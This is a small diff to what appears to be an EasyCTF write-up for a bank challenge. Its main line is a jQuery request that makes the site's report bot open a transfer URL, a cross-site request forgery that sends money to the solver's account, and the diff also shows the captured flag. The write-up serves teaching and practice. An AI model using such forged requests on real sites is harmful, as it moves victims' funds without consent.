@@ -6,9 +6,7 @@ run:
 
 $.post('/api/report',{page:"http://web.easyctf.com:10206/api/bank/transfer?recipient=<USERNAME_HERE>&amount=100000"});
 
-Flag:
+Buy a flag with your new money.
 
 Thanks for purchasing Premium Infinity by Infinity Star Bank. Here's your flag:
 easyctf{csrf_protection_would_probably_have_been_a_good_idea_:/}
-
-
